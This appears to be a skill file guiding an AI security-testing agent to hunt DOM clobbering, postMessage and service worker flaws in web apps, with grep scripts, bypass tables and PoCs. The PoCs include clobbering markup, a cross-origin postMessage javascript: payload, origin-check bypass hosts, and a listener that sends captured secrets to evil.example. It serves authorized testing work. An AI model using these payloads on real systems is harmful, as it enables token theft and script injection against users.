---
name: dom-based
description: >
  Hunt for client-side DOM vulnerabilities that live entirely in the browser: DOM clobbering
  (HTML-injected named elements overriding JS globals/properties), postMessage abuse (missing
  origin checks on receivers, overly broad targetOrigin on senders), and service worker abuse
  (scope hijack, cache poisoning, insecure registration). Use when the app is JS-heavy, mixes
  user HTML with client logic, communicates cross-frame/cross-window via postMessage, or registers
  a service worker. Keywords: dom clobbering, postmessage, message event, origin check, service
  worker, sw scope, cache storage, client-side, window.name, named element, getElementById.
  Do NOT use for reflected/stored script injection that executes a payload directly (use xss) —
  this skill targets DOM structural abuse and client-trust flaws, which may *feed* XSS but are
  their own class.
metadata:
  type: hunt
  phase: hunting
  cwe: [CWE-79, CWE-1385, CWE-346, CWE-668]
  mitre_attack: [T1185, T1189]
  tools: [burp, chrome-devtools, dom-invader, python-http-server]
depends_on: [web-crawling, js-analysis, fuzzing]
feeds_into: [chain-analysis, csrf, info-disclosure]
chains_with: [xss, csrf, auth-bypass]
---

## Signals

- **DOM clobbering:** app renders user-controlled HTML (even "sanitized" HTML that allows `id`/
  `name` attributes — many sanitizers do) and client JS reads globals via `document.x`,
  `window.x`, or `getElementById`-style lookups, or uses patterns like
  `config = config || window.CONFIG`, `someLib.sanitize = someLib.sanitize || defaults`.
- **postMessage:** `window.addEventListener('message', handler)` in the JS with a handler that
  uses `event.data` without checking `event.origin`; or `targetWindow.postMessage(data, '*')`
  sending sensitive data to any origin. Grep the bundles for `addEventListener("message"` and
  `.postMessage(`.
- **Service workers:** a `navigator.serviceWorker.register('/sw.js')` call, a `/sw.js` served
  with a broad `Service-Worker-Allowed` scope, or SW registration from a path an attacker can
  influence; `Cache` API usage caching responses that include auth-bearing or HTML content.
- Sinks reached via DOM sources (`location.hash`, `document.referrer`, `window.name`,
  `postMessage`) flowing into `innerHTML`, `eval`, `document.write`, `setAttribute('src')`.

## Prerequisites

- Access to the delivered client JS (source or beautified bundles) to trace source→sink and the
  message/SW handlers (chain js-analysis).
- A browser with DevTools (Console, Application→Service Workers/Storage) and ideally Burp
  DOM Invader for automated source/sink and clobbering detection.
- For postMessage/SW PoCs: an attacker-controlled page you can host (a local `python3 -m
  http.server` page that opens/iframes the target and sends messages) — scoped to your own infra.

## Methodology

1. **Map DOM sources and sinks (chain js-analysis).** Trace `location.*`, `document.referrer`,
   `window.name`, `postMessage` data, and `document.cookie` into dangerous sinks. DOM Invader or a
   manual grep over the beautified bundles:
   ```bash
   # pull the bundles and grep for message handlers, SW registration, and clobberable lookups
   for js in $(curl -s https://target/ | grep -oE 'src="[^"]+\.js"' | sed -E 's/src="([^"]+)"/\1/'); do
     curl -s "https://target/$js" -o /tmp/b.js
     grep -nE "addEventListener\(['\"]message|\.postMessage\(|serviceWorker\.register|\.innerHTML|document\.write|window\.[A-Za-z_]+ *\|\||getElementById" /tmp/b.js
   done
   ```

2. **DOM clobbering.** If user HTML allows `id`/`name`, inject named elements to overwrite the
   globals/properties the JS trusts. Named elements become `window[name]` / `document[name]`:
   ```html
   <!-- clobber a global the app reads, e.g. window.CONFIG or document.defaultUrl -->
   <a id="CONFIG"><a id="CONFIG" name="url" href="https://evil.example/x"></a>
   <!-- form+input trick to clobber nested property like config.endpoint.href -->
   <form id="config"><input name="endpoint" value="..."></form>
   ```
   Confirm the clobbered value is actually consumed (e.g. redirect target, script src, feature
   flag) — show the JS reading your injected node instead of its intended value. Clobbering a
   sink guard (e.g. a `sanitizer` reference) can re-enable XSS.

3. **postMessage receiver abuse.** For a `message` handler with no/weak origin check, host a page
   that sends crafted data and observe the effect (DOM write, token relay, navigation, state
   change):
   ```html
   <!-- attacker page: open target, post malicious data; receiver trusts event.data blindly -->
   <iframe src="https://target/app" id="t"></iframe>
   <script>
     t.onload = () => t.contentWindow.postMessage(
       {type:'setProfileImg', url:'javascript:alert(document.domain)'}, '*');
   </script>
   ```
   Prove the handler acts on cross-origin data (origin not validated, or validated by a weak
   `indexOf('target.com')` that `target.com.evil.net` passes).

4. **postMessage sender leak.** Find senders using `'*'` targetOrigin carrying sensitive data
   (tokens, user info). Host a page that frames/opens the target and listens:
   ```html
   <script>window.addEventListener('message', e => fetch('https://evil.example/log?d='+btoa(e.data)));</script>
   ```
   If the target posts secrets to `'*'`, any framing origin captures them.

5. **Service worker abuse.** Check scope and registration trust:
   ```bash
   curl -sI https://target/sw.js | grep -i "service-worker-allowed\|content-type"
   ```
   - If `Service-Worker-Allowed` is overly broad, or SW can be registered from a path that serves
     attacker HTML/JS, a worker can intercept and poison responses for a whole scope.
   - In DevTools Application→Service Workers, inspect `fetch` handlers caching auth-bearing
     responses (Cache API) that a later victim could read, or SW serving stale/poisoned content.

6. **Prove the security effect, not just the mechanism.** A clobbered variable, a fired handler,
   or a registered SW is a mechanism; the finding is the resulting impact (redirect to attacker,
   token theft, XSS re-enabled, response poisoning). Demonstrate that.

## Tooling

- Burp Suite DOM Invader — automated DOM source/sink tracing, clobbering candidate detection,
  postMessage interception.
- Chrome DevTools — Console (trace reads of clobbered globals), Application tab (Service Workers,
  Cache Storage, scope), Sources (breakpoints on message handlers).
- A hosted attacker page (`python3 -m http.server` on your own box/VPS) for postMessage and SW
  PoCs — never point a PoC at third-party infrastructure.
- `curl` for SW headers/scope and bundle retrieval.

## Root Causes

- Sanitizers/renderers that permit `id`/`name` attributes in user HTML, combined with JS that
  resolves configuration/globals via DOM lookups (`window.x`, `document.getElementById`,
  `x || window.X`) — classic DOM clobbering surface.
- `message` event handlers that use `event.data` without strictly validating `event.origin`
  (missing check, or substring/regex checks that match attacker subdomains).
- `postMessage(data, '*')` on the sender side leaking data to any origin.
- Service workers registered with broad scope, served from user-influenced paths, or caching
  sensitive/HTML responses without origin/auth considerations.
- General client-side trust of untrusted DOM sources (`hash`, `referrer`, `window.name`) flowing
  into sinks.

## Validation Gate (minimum proof)

- **Demonstrated:** a working client-side PoC showing concrete impact — clobbered global causing
  an attacker-controlled redirect/script-src/feature-flag (or re-enabling XSS), a postMessage
  handler acting on cross-origin data (state change / DOM write / nav), a `'*'` sender leaking a
  real secret captured by your listener, or a service worker poisoning/leaking a response. Include
  the HTML/JS PoC and the observed effect (screenshot/console/network).
- **Inferred:** the mechanism is present and partially shown (handler fires on cross-origin
  message, or a clobberable global is read) but the end impact isn't yet driven — e.g. origin
  check is missing but no sensitive sink reached in this test.
- **Unproven:** "there's an `addEventListener('message')` with no origin check" or "sanitizer
  allows `id`" with no PoC causing an effect. Do not report as a finding; log as a lead.
- Specify the sub-class (clobbering / postMessage-receiver / postMessage-sender / service-worker)
  and the exact source→sink or trust boundary — remediation differs per sub-class.

## Payloads & Detection Patterns

| Categoría | Shape | Propósito |
|---|---|---|
| Clobber global | `<a id="X"><a id="X" name="y" href="...">` | overwrite `window.X` / `X.y` the JS reads |
| Clobber nested | `<form id="cfg"><input name="url" value="..">` | set `cfg.url` property |
| Clobber guard | named node replacing a sanitizer/flag ref | re-enable a disabled sink (→ xss) |
| pM receiver | `postMessage({type:'...',payload}, '*')` from attacker page | hit handler lacking origin check |
| pM origin bypass | origin `https://target.com.evil.net` | beat substring/`indexOf` origin checks |
| pM sender leak | listen for messages while framing target | capture secrets sent to `'*'` |
| SW scope probe | `GET /sw.js` read `Service-Worker-Allowed` | find over-broad worker scope |

```bash
# Detection: inventory the three sub-classes from the delivered JS and SW headers.
curl -s https://target/ -o /tmp/idx.html
mapfile -t JS < <(grep -oE '(src|href)="[^"]+\.js"' /tmp/idx.html | sed -E 's/.*="([^"]+)".*/\1/')
for j in "${JS[@]}"; do
  u="https://target/${j#/}"; curl -s "$u" -o /tmp/b.js
  echo "== $u =="
  grep -nE "addEventListener\(['\"]message" /tmp/b.js && echo "  [postMessage receiver]"
  grep -nE "\.postMessage\([^,]+, *['\"]\*['\"]" /tmp/b.js && echo "  [sender targetOrigin='*']"
  grep -nE "serviceWorker\.register" /tmp/b.js && echo "  [SW registration]"
  grep -nE "window\.[A-Za-z_][A-Za-z0-9_]* *\|\||getElementById|document\.[A-Za-z_]+ *\|\|" /tmp/b.js \
    && echo "  [clobberable lookup]"
done
curl -sI https://target/sw.js | grep -i "service-worker-allowed"
# Receivers without a nearby event.origin check, '*' senders, or broad SW scope are leads to PoC.
```

## Bypass Techniques

| Filtro evadido | Técnica | Notas |
|---|---|---|
| sanitizer strips scripts | DOM clobbering via allowed `id`/`name` | no script needed; abuse structure |
| origin `indexOf('target.com')` | origin `https://target.com.evil.net` or `evil-target.com` | substring match is not an equality check |
| origin allowlist startsWith | `https://target.com.attacker/` | prefix/suffix confusion |
| SW same-origin only | register from user-controlled path on-origin | scope widened via `Service-Worker-Allowed` |
| CSP blocks inline | clobber a URL the app itself fetches/executes | effect via app's own trusted fetch |
| framebusting | use `postMessage` to a popup (`window.open`) not iframe | avoids X-Frame-Options |

## Chain Anchors

Before declaring this finding complete, probe these escalation paths:

1. **Re-enable XSS** — Does clobbering a sanitizer/flag or a postMessage DOM write reach an
   `innerHTML`/`eval`/`src` sink? Chain xss for script execution.
2. **Token/secret theft** — Does a `'*'` sender or a cached SW response expose auth tokens,
   session data, or PII? Chain info-disclosure.
3. **CSRF-like state change** — Can the postMessage handler trigger a privileged action
   cross-origin without a token? Chain csrf.
4. **Open redirect / nav hijack** — Clobbered redirect target or handler-driven `location`
   assignment → phishing/token leak via redirect (chain open-redirect).
5. **Persistent client compromise** — A malicious/poisoned service worker persists across visits;
   assess scope and whether it can serve attacker content to future sessions.

A finding without chain anchor results is INCOMPLETE. Record each anchor as
tested/not-applicable/blocked with the reason.

## Chains & Compositions

- DOM clobbering → disables sanitizer/guard → **xss** (bypass that blocked direct injection).
- postMessage receiver without origin check → **csrf** (cross-origin state change) or **xss**
  (data into DOM sink).
- postMessage `'*'` sender → **info-disclosure** (token/PII leak to framing origin).
- Service worker scope hijack → response poisoning → **xss** / phishing persistence.
- Clobbered redirect target → **open-redirect** → credential/token phishing.

## Gotchas

- **Mechanism ≠ finding.** A missing origin check, a clobberable global, or an SW registration is
  a lead. The report needs the *effect* (redirect, token theft, XSS, poisoning) demonstrated with
  a PoC — per anti-fabrication, "could allow" without a trigger is not a finding.
- **Browser differences matter.** DOM clobbering behaviour varies (named-element collections,
  `HTMLCollection` vs single element) across Chrome/Firefox/Safari; state the browser/version your
  PoC worked in and don't generalize beyond what you tested.
- **Origin check may be elsewhere.** A handler without an inline `event.origin` check might be
  guarded by a wrapper or a trusted-frames list — trace the full path before claiming it's
  unvalidated; test with an actual cross-origin message.
- **Self-XSS trap.** If the only way to trigger the clobbering/handler is the victim pasting your
  HTML into their own page/console, it's self-XSS, not a deliverable finding — show a realistic
  injection/ delivery path.
- **Service worker PoCs persist.** A registered worker survives navigation; clean up
  (unregister in DevTools) and never register a worker on infrastructure you don't own.
- **Common N/A:** sanitizer strips `id`/`name`, handlers strictly compare `event.origin ===
  'https://trusted'`, senders use explicit targetOrigin, SW scope is tight and caches nothing
  sensitive — record tested-and-safe with the evidence.
